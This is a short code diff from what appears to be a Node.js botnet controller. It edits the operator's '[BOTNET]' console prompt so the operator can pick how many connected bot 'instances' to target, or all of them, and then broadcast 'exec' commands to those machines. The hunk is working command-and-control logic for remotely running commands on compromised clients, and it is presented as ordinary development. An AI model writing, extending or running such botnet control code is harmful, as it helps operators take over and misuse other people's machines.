@@ -41,14 +41,22 @@ net
 
     function prompt() {
       readline.question("[BOTNET] ", (msg) => {
-        if (msg.startsWith("instances") && msg.split(" ")[1]) {
-					clientInstances = [...clients];
-					clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
-        }
-				if (msg.toLowerCase() === "instances") {
+				msg = msg.toLowerCase();
+
+				if (msg === "instances") {
 					console.log(`Instances: ${clientInstances.length}`);
 				}
-        if (msg.toLowerCase().startsWith("exec")) broadcast(msg);
+
+        if (msg.startsWith("instances")) {
+					if (msg.split(" ")[1] <= clients.length) {
+						clientInstances = [...clients];
+						clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
+					}
+        }
+
+				if (msg.split(" ")[1] === "all") clientInstances = [...clients];
+
+        if (msg.startsWith("exec")) broadcast(msg);
         return prompt();
       });
     }
